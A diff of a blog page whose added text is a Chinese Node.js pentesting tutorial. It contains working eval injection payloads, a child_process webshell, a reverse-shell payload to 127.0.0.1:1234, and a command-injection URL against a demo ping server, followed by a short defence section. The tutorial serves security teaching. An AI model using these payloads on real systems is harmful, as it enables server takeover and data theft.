+<p>然后执行<code>node test.js</code>即可在本地<code>8001</code>端口启动一个简单的web应用程序。<br><img src="https://i.loli.net/2019/07/12/5d2882fb3610d56344.png" alt></p>
+<h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>在渗透测试过程种，对目标的渗透必要要经过信息收集以获取更过的信息来定制下一步的行动计划。对Node.js应用的渗透也要经过信息收集，以确定目标是否使用了Node.js。收集过程中重点留意cookies， name[“connect.sid”]，server以及 X-powered-By 等头信息。如在前面搭建起的环境种，<code>X-powered-By</code>头暴露了目标使用<code>express</code>框架。<br><img src="https://i.loli.net/2019/07/12/5d28846f8727a76819.png" alt><br>此外，程序运行时意外的报错信息也能帮助获取更多的信息，当然，一个大型的项目很少会出现这种报错。<br>但在上面的demo中，输入的input中带有一些特殊字符时将触发报错。<br><img src="https://i.loli.net/2019/07/12/5d28865b486e137355.png" alt><br>在得知目标为<code>Node.js</code>应用后，便可以进行进一步的利用。</p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="服务端代码执行"><a href="#服务端代码执行" class="headerlink" title="服务端代码执行"></a>服务端代码执行</h3><p>在前面的demo中，通过get传入的参数未经任何过滤而直接进入到<code>eval()</code>函数中执行，此处便存在代码执行漏洞。<br>下面是可以用于测试的一些payload</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">process</span>.arch</span><br><span class="line"><span class="built_in">process</span>.argv</span><br><span class="line"><span class="built_in">process</span>.argv0</span><br><span class="line"><span class="built_in">process</span>.channel</span><br><span class="line"><span class="built_in">process</span>.cwd()</span><br><span class="line"><span class="built_in">process</span>.geteuid()</span><br><span class="line"><span class="built_in">process</span>.getegid()</span><br><span class="line"><span class="built_in">process</span>.pid</span><br><span class="line"><span class="built_in">process</span>.<span class="built_in">platform</span></span><br><span class="line"><span class="built_in">process</span>.<span class="built_in">version</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/07/12/5d2888947cf8370728.png" alt><br>甚至可以传入<code>process.exit()</code>终止程序的运行。<br><img src="https://i.loli.net/2019/07/12/5d28894f0822b82705.png" alt></p>
+<p>读取文件<code>require(&#39;fs&#39;).readFileSync(&#39;test.js&#39;).toString()</code><br><img src="https://i.loli.net/2019/07/12/5d2889c16bdee95884.png" alt></p>
+<p>获取webshell<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123; <span class="built_in">require</span>(<span class="string">'http'</span>).createServer(<span class="function"><span class="keyword">function</span> <span class="params">(req, res)</span></span> &#123; res.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;);<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="built_in">require</span>(<span class="string">'url'</span>).parse(req.url, <span class="literal">true</span>).query[<span class="string">'cmd'</span>], <span class="function"><span class="keyword">function</span><span class="params">(e,s,st)</span></span> &#123;res.<span class="keyword">end</span>(s);&#125;); &#125;).listen(<span class="number">8003</span>); &#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/07/16/5d2d2ea8632f956229.png" alt><br>这里传入<code>setTimeout</code>函数，三秒后在8003端口启动一个webshell。(延时时间最好大于1s，否则可能执行失败)<br><img src="https://i.loli.net/2019/07/16/5d2d2e91221c876341.png" alt><br>成功执行命令，可以看到<code>setTimeout</code>也可以执行任意代码，所以会任何进入系统函数的用户输入都是不安全的，在测试过程不仅要注意<code>eval</code>函数，还要注意<code>setTimeuut</code> <code>setInterval</code>等系统函数。</p>
+<p>获取反弹shell<br>payload<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rev</span>(<span class="params">host,port</span>)</span>&#123;<span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);<span class="keyword">var</span> cp  = <span class="built_in">require</span>(<span class="string">'child_process'</span>);<span class="keyword">var</span> cmd = cp.spawn(<span class="string">'cmd.exe'</span>, []);<span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();client.connect(port, host, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.write(<span class="string">'Connected\r\n'</span>); client.pipe(cmd.stdin); cmd.stdout.pipe(client);cmd.stderr.pipe(client);client.on(<span class="string">'exit'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">code,signal</span>)</span>&#123; client.end(<span class="string">'Disconnected\r\n'</span>); &#125; );client.on( <span class="string">'error'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123; setTimeout( rev(host,port), <span class="number">5000</span>); &#125;)&#125;);&#125;;rev(<span class="string">'127.0.0.1'</span>, <span class="number">1234</span>);</span><br></pre></td></tr></table></figure></p>
+<p>这里也可使用<a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank" rel="noopener">nodejsshell.py</a>生成编码后的nodejs代码<br>输入监听的ip 端口<br><img src="https://i.loli.net/2019/07/16/5d2d38593d54c25929.png" alt><br>执行生成的payload<br><img src="https://i.loli.net/2019/07/16/5d2d38a07e94893643.png" alt><br>nc成功监听到返回的shell<br><img src="https://i.loli.net/2019/07/16/5d2d38dc0856c30683.png" alt><br>目标为Linux主机可以返回<code>/bin/bash</code>,windows下可以返回<code>cmd.exe</code>，可以在生成代码的第36行进行修改<br><img src="https://i.loli.net/2019/07/16/5d2d39482974b24029.png" alt></p>
+<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p><code>Node.js</code>的远程命令执行主要是由于没有正确使用<code>child_process</code>模块造成的，该模块可以创建一个新的进程进来执行系统命令。<br><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">url</span> = <span class="built_in">require</span>(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">var</span> exe = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parsedUrl = <span class="built_in">url</span>.parse(request.url, <span class="literal">true</span>);</span><br><span class="line">  response.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/html"</span>&#125;);</span><br><span class="line">  exe.exec(<span class="string">'ping -c 2 '</span> + parsedUrl.query.ping, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">  response.write(<span class="string">"Hello "</span>+ data);</span><br><span class="line">  response.end();</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure></p>
+<p>上面的demo中使用了<code>child_process</code>模块的exec函数来进行系统交互来执行<code>ping</code>命令。但是由于没有正确过滤传入的参数，从而造成任意系统命令执行。<br>正常服务<br><img src="https://i.loli.net/2019/08/07/9Py6NVuzFOjYB5l.png" alt><br>执行任意命令<br><code>http://127.0.0.1:8888/?ping=www.baidu.com;||dir</code><br><img src="https://i.loli.net/2019/08/07/ygQtSMiX3JIWldn.png" alt></p>
+<h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p>这是<code>Node.js</code>一个比较独特的特性，允许一个参数有多个值传入，当对一个参数传入多个值时，中间会以逗号<code>,</code>进行拼接。<br>比如上面的demo中，我们传入两个ping值<br><img src="https://i.loli.net/2019/08/07/yxjezVQbuZApCcK.png" alt><br>这个特性可能会引起参数解析漏洞或者在绕过waf时提供思路。</p>
+<h2 id="0x04-防护"><a href="#0x04-防护" class="headerlink" title="0x04 防护"></a>0x04 防护</h2><p>在给出的<code>Node.js</code>不安全的demo中，可以明显的看出，同其他语言一样，所有未加过滤的用输入都是不安全的，所以在开发过程中应时刻注意对用户输入做适当的处理，令附node.js安全开发的一些参考<a href="https://www.cnblogs.com/qingmingsang/articles/10397870.html" target="_blank" rel="noopener">https://www.cnblogs.com/qingmingsang/articles/10397870.html</a></p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://bbs.ichunqiu.com/thread-24807-1-1.html?from=beef" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-24807-1-1.html</a><br><a href="https://www.jianshu.com/p/8253adac33d8" target="_blank" rel="noopener">https://www.jianshu.com/p/8253adac33d8</a></p>
 
       
     </div>
@@ -494,12 +470,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/使用Hadoop-JAVA-API-远程连接HDFS/">使用Hadoop JAVA API 远程连接HDFS</a></p>
+  <p><span>本文标题:</span><a href="/Nodejs安全/">Nodejs安全</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
-  <p><span>发布时间:</span>2019年03月29日 - 21:43</p>
-  <p><span>最后更新:</span>2019年05月08日 - 10:40</p>
-  <p><span>原始链接:</span><a href="/使用Hadoop-JAVA-API-远程连接HDFS/" title="使用Hadoop JAVA API 远程连接HDFS">https://zhengbao.wang/使用Hadoop-JAVA-API-远程连接HDFS/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zhengbao.wang/使用Hadoop-JAVA-API-远程连接HDFS/" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年08月07日 - 14:53</p>
+  <p><span>最后更新:</span>2019年08月07日 - 14:54</p>
+  <p><span>原始链接:</span><a href="/Nodejs安全/" title="Nodejs安全">https://zhengbao.wang/Nodejs安全/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zhengbao.wang/Nodejs安全/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -556,12 +532,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/hadoop/" rel="tag"><i class="fa fa-tag"></i> hadoop</a>
-          
-        </div>
-      
 
       
       
@@ -571,8 +541,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/内部AWD攻防对抗web记录/" rel="next" title="内部AWD攻防对抗web记录">
-                <i class="fa fa-chevron-left"></i> 内部AWD攻防对抗web记录
+              <a href="/Linux-run-fsck-failed问题解决办法/" rel="next" title="Linux run fsck failed问题解决办法">
+                <i class="fa fa-chevron-left"></i> Linux run fsck failed问题解决办法
               </a>
             
           </div>
@@ -580,10 +550,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/Docker网络模式详解/" rel="prev" title="Docker网络模式详解">
-                Docker网络模式详解 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -778,7 +744,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-本地操作HDFS"><span class="nav-number">2.</span> <span class="nav-text">0x01 本地操作HDFS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-IDEA远程连接HDFS"><span class="nav-number">3.</span> <span class="nav-text">0x02 IDEA远程连接HDFS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#准备环境"><span class="nav-number">3.1.</span> <span class="nav-text">准备环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#建立工程"><span class="nav-number">3.2.</span> <span class="nav-text">建立工程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试"><span class="nav-number">3.3.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#详细代码"><span class="nav-number">3.4.</span> <span class="nav-text">详细代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-问题解决"><span class="nav-number">4.</span> <span class="nav-text">0x03 问题解决</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-环境搭建"><span class="nav-number">2.</span> <span class="nav-text">0x01 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-信息收集"><span class="nav-number">3.</span> <span class="nav-text">0x02 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">0x03 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端代码执行"><span class="nav-number">4.1.</span> <span class="nav-text">服务端代码执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程命令执行"><span class="nav-number">4.2.</span> <span class="nav-text">远程命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP参数污染"><span class="nav-number">4.3.</span> <span class="nav-text">HTTP参数污染</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-防护"><span class="nav-number">5.</span> <span class="nav-text">0x04 防护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-参考链接"><span class="nav-number">6.</span> <span class="nav-text">0x05 参考链接</span></a></li></ol></div>
             
 
           </div>
